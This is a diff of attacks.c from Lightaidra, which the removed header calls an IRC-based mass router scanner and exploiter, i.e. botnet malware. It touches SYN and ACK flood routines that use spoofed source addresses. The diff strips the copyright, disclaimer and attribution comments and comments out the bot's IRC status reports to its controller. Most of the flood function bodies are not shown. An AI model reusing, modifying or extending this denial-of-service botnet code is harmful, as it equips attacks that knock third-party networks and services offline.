@@ -1,25 +1,9 @@
-/*
- * attacks.c - USE LIGHTAIDRA AT YOUR OWN RISK!
- *
- * Lightaidra - IRC-based mass router scanner/exploiter.
- * Copyright (C) 2008-2015 Federico Fazzi, <eurialo@deftcode.ninja>.
- *
- * LEGAL DISCLAIMER: It is the end user's responsibility to obey 
- * all applicable local, state and federal laws. Developers assume 
- * no liability and are not responsible for any misuse or damage 
- * caused by this program.
- *
- */
-
 #include "../include/headers.h"
 
 unsigned int get_spoofed();
 unsigned short in_cksum(unsigned short *ptr, int nbytes);
 int sockwrite(int sd, const char *fmt, ...);
 
-
-/* synflood(), ngsynflood(), ackflood(), ngackflood() */
-/* these functions are adapted from ktx.c             */
 void synflood(sock_t * sp, unsigned int dest_addr, unsigned short dest_port, int ntime) {
     int get;
     struct send_tcp send_tcp;
@@ -100,9 +84,9 @@ void synflood(sock_t * sp, unsigned int dest_addr, unsigned short dest_port, int
 
         if (a >= 50) {
             if (time(NULL) >= start + secs) {
-                sockwrite(sp->sockfd, "PRIVMSG %s :[nsynflood] packeting completed!\n", channel);
+                //sockwrite(sp->sockfd, "PRIVMSG %s :[nsynflood] packeting completed!\n", channel);
                 close(get);
-                sockwrite(sp->sockfd, "QUOTE ZOMBIE\n");
+                //sockwrite(sp->sockfd, "QUOTE ZOMBIE\n");
                 exit(EXIT_SUCCESS);
             }
 
@@ -113,7 +97,7 @@ void synflood(sock_t * sp, unsigned int dest_addr, unsigned short dest_port, int
     }
 
     close(get);
-    sockwrite(sp->sockfd, "QUOTE ZOMBIE\n");
+    //sockwrite(sp->sockfd, "QUOTE ZOMBIE\n");
     exit(EXIT_FAILURE);
 }
 
@@ -197,9 +181,9 @@ void ngsynflood(sock_t * sp, unsigned int dest_addr, unsigned short dest_port, i
     
         if (a >= 50) {
             if (time(NULL) >= start + secs) {
-                sockwrite(sp->sockfd, "PRIVMSG %s :[ngsynflood] packeting completed!\n", channel);
+                //sockwrite(sp->sockfd, "PRIVMSG %s :[ngsynflood] packeting completed!\n", channel);
                 close(get);
-                sockwrite(sp->sockfd, "QUOTE ZOMBIE\n");
+                //sockwrite(sp->sockfd, "QUOTE ZOMBIE\n");
                 exit(EXIT_SUCCESS);
             }
 
@@ -210,7 +194,7 @@ void ngsynflood(sock_t * sp, unsigned int dest_addr, unsigned short dest_port, i
     }
 
     close(get);
-    sockwrite(sp->sockfd, "QUOTE ZOMBIE\n");
+    //sockwrite(sp->sockfd, "QUOTE ZOMBIE\n");
     exit(EXIT_FAILURE);
 }
 
@@ -286,9 +270,9 @@ void ackflood(sock_t * sp, unsigned int dest_addr, unsigned short dest_port, int
 
         if (a >= 50) {
             if (time(NULL) >= start + secs) {
-                sockwrite(sp->sockfd, "PRIVMSG %s :[ackflood] packeting completed!\n", channel);
+                //sockwrite(sp->sockfd, "PRIVMSG %s :[ackflood] packeting completed!\n", channel);
                 close(get);
-                sockwrite(sp->sockfd, "QUOTE ZOMBIE\n");
+                //sockwrite(sp->sockfd, "QUOTE ZOMBIE\n");
                 exit(EXIT_SUCCESS);
             }
 
@@ -299,7 +283,7 @@ void ackflood(sock_t * sp, unsigned int dest_addr, unsigned short dest_port, int
     }
 
     close(get);
-    sockwrite(sp->sockfd, "QUOTE ZOMBIE\n");
+    //sockwrite(sp->sockfd, "QUOTE ZOMBIE\n");
 
     exit(EXIT_FAILURE);
 }
@@ -379,9 +363,9 @@ void ngackflood(sock_t * sp, unsigned int dest_addr, unsigned short dest_port, i
 
         if (a >= 50) {
             if (time(NULL) >= start + secs) {
-                sockwrite(sp->sockfd, "PRIVMSG %s :[ngackflood] packeting completed!\n", channel);
+                //sockwrite(sp->sockfd, "PRIVMSG %s :[ngackflood] packeting completed!\n", channel);
                 close(get);
-                sockwrite(sp->sockfd, "QUOTE ZOMBIE\n");
+                //sockwrite(sp->sockfd, "QUOTE ZOMBIE\n");
                 exit(EXIT_SUCCESS);
             }
 
@@ -392,7 +376,7 @@ void ngackflood(sock_t * sp, unsigned int dest_addr, unsigned short dest_port, i
     }
 
     close(get);
-    sockwrite(sp->sockfd, "QUOTE ZOMBIE\n");
+    //sockwrite(sp->sockfd, "QUOTE ZOMBIE\n");
 
     exit(EXIT_FAILURE);
 }
